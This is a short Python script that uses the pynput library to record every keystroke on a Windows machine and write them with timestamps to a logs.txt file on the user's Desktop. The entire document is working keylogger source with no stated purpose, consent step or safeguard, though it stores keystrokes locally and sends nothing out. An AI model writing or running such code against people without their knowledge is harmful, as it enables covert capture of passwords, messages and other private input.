#!/usr/bin/env python

# modules
from pynput.keyboard import Listener

import os
import logging

user = os.getlogin() # User
logDir = f"C:/Users/{user}/Desktop/" # Output directory

logging.basicConfig(filename=f"{logDir}/logs.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s") # Output format and path

def key_handler(key):
    logging.info(key)

with Listener (on_press = key_handler) as Listener:
    Listener.join() # Output handler
